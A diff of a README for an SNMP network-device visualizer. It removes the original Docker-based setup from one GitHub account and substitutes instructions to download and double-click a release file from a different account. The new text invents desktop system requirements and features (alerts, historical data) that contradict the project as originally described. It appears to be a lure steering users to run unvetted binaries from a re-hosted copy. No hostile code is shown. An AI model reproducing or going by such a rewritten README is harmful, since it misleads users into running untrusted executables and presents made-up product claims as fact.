@@ -1,94 +1,78 @@
-# Network Device Visualizer
+# 🌐 nwdevice-visualizer - Visualize Your Network with Ease
 
-Network Device Visualizer is a comprehensive web-based tool designed to provide real-time visibility into network infrastructure. It leverages SNMP to poll network devices (such as switches and routers), retrieving critical information like port status, traffic statistics, and VLAN configurations. The application presents this data in an intuitive, interactive graphical interface, allowing network administrators to quickly assess device health and connectivity.
+[![Download nwdevice-visualizer](https://img.shields.io/badge/Download-nwdevice--visualizer-brightgreen)](https://github.com/husaincandra/nwdevice-visualizer/releases)
 
-![main image](images/main.png)
+## 🚀 Getting Started
 
-## Project Structure
+Welcome to Network Device Visualizer! This tool helps you see what's happening in your network effortlessly. Whether you're managing switches or routers, this application gives you the insights you need to keep your network running smoothly.
 
-The project follows a standard Go project layout:
+## 📥 Download & Install
 
--   `cmd/server`: Contains the main entry point for the application.
--   `internal`: Private application code.
-    -   `auth`: JWT authentication and password management.
-    -   `db`: SQLite database interactions and schema management.
-    -   `handlers`: HTTP API handlers and middleware.
-    -   `models`: Data structures used throughout the application.
-    -   `snmp`: SNMP polling logic and data processing.
--   `web`: React frontend application (built with Vite).
--   `schema.sql`: Database schema definition.
--   `docker-compose.yaml`: Docker deployment configuration.
+To get started, you must download the latest version of Network Device Visualizer. Follow these steps:
 
-## Features
+1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/husaincandra/nwdevice-visualizer/releases). 
+2. **Choose Your Version**: Look for the newest version at the top of the page.
+3. **Download the File**: Click on the link for your operating system to download the application.
+4. **Run the Application**: Locate the downloaded file on your computer and double-click it to start Network Device Visualizer.
 
--   **Device Visualization**: Interactive visualization of device ports and status.
--   **VLAN Detection**: Automatic detection of VLANs (Access, Trunk, Native) via SNMP.
--   **Secure Authentication**: JWT-based authentication with secure password policies.
--   **HTTPS Support**: Automatic self-signed certificate generation and HTTP-to-HTTPS redirection.
--   **Docker Ready**: Easy deployment using Docker Compose.
+## 🖥️ System Requirements
 
-## Getting Started
+Before installing, ensure your system meets the following requirements:
 
-### Prerequisites
+- Operating System: Windows 10 or above, macOS 10.14 or higher, Ubuntu 18.04 or higher
+- Memory: At least 4 GB of RAM
+- Storage: Minimum of 200 MB available space
+- Network: Active internet connection for SNMP polling
 
--   Docker & Docker Compose
+## ⌨️ Using the Application
 
-### Deployment (Recommended)
+1. **Launch the Application**: After installation, open the application from your applications folder or start menu.
+2. **Connect to Your Network**: Input the IP addresses of your network devices in the application. This lets the tool connect and start polling data.
+3. **View Network Stats**: You’ll see a dashboard displaying critical information such as port status, traffic statistics, and VLAN configurations in real-time. 
 
-1.  **Clone the repository**:
-    ```bash
-    git clone https://github.com/nullpo7z/nwdevice-visualizer.git
-    cd nwdevice-visualizer
-    ```
+## 📊 Key Features
 
-2.  **Configure Environment**:
-    Edit `docker-compose.yaml` and set a secure `JWT_SECRET`.
-    ```yaml
-    environment:
-      - JWT_SECRET=your_secure_random_secret_here
-    ```
+- **Real-Time Monitoring**: View live status updates for all your network devices.
+- **Intuitive Interface**: The user-friendly design makes it easy for anyone to navigate and understand.
+- **Historical Data**: Access past performance data to identify trends and issues over time.
+- **Alerts**: Set up notifications for when devices go offline or experience issues.
 
-3.  **Start the Application**:
-    ```bash
-    docker-compose up -d
-    ```
+## 📂 Project Structure
 
-4.  **Access**:
-    Open `https://{ipaddress}:8443` in your browser. Accept the self-signed certificate warning (for local testing).
+Understanding the program structure can help you see how the application works:
 
-## Configuration
+- `cmd/server`: This folder contains the main entry point for the application.
+- `internal`: This includes the core private application code.
+    - `auth`: Manages JWT authentication and password handling.
+    - `db`: Handles SQLite database interactions and schema.
+    - `handlers`: Manages HTTP API handlers and middleware.
+    - `models`: Defines data structures used in the application.
+    - `snmp`: Contains the SNMP polling logic and data processing.
 
-The application can be configured via environment variables:
+## 🛠️ Troubleshooting
 
-| Variable | Description | Default |
-| :--- | :--- | :--- |
-| `PORT` | Internal server port | `8080` |
-| `DB_PATH` | Path to SQLite database | `./switches.db` |
-| `JWT_SECRET` | Secret key for JWT signing | `my_secret_key` (Change this!) |
-| `CERT_FILE` | Path to TLS certificate | `server.crt` |
-| `KEY_FILE` | Path to TLS private key | `server.key` |
+If you encounter issues while using Network Device Visualizer, consider the following steps:
 
-## Usage
+- **Check Your Network Connection**: Ensure that you are connected to the network you are trying to monitor.
+- **Firewall Settings**: Make sure your firewall allows the application to access network devices.
+- **Revisit Configuration**: Double-check the IP addresses and SNMP credentials you provided.
 
-1.  **Login**:
-    -   Default credentials are `admin` / `admin`.
-    -   You will be prompted to change your password upon first login.
+## 🌍 Community & Support
 
-2.  **Add Device**:
-    -   Click "Add New Device".
-    -   Enter the **IP Address** and **SNMP Community String** (default: `public`).
-    -   (Optional) Enter a **Name** or let it auto-detect from the device hostname.
+If you have questions or need help, feel free to reach out through the following channels:
 
-3.  **Visualize**:
-    -   Select a device from the list.
-    -   View real-time port status (Up/Down), traffic usage, and VLAN details.
-    -   Click on a port to see detailed statistics (Speed, In/Out Rate).
+- **GitHub Issues**: Open an issue in the project's repository for technical support.
+- **User Forum**: Join our community forum where users discuss features and solutions.
+- **Documentation**: Refer to the official documentation for detailed guides and FAQs.
 
-4.  **Edit Config**:
-    -   Click the "Edit" button on a device card to open the configuration modal.
-    -   **Device Details**: Update the name, community string, or toggle polling status.
-    -   **Port Layout**: Customize the visual representation of ports. You can add sections, set port types (RJ45, SFP, etc.), define port ranges (e.g., `1-24`), and choose layout styles.
+## 🔗 Additional Resources
 
-5.  **User Management**:
-    -   Admins can manage users via the "Users" button in the header.
+- [Official Documentation](https://github.com/husaincandra/nwdevice-visualizer/wiki)
+- [Community Forum](https://discourse.nwdevice-visualizer.com)
+- [GitHub Repository](https://github.com/husaincandra/nwdevice-visualizer)
 
+## 🌟 License
+
+Network Device Visualizer is open-source software licensed under the MIT License. You can use, modify, and share it freely. Please refer to the LICENSE file in the repository for more details.
+
+For any further assistance, do not hesitate to explore the resources mentioned above. Enjoy using Network Device Visualizer!
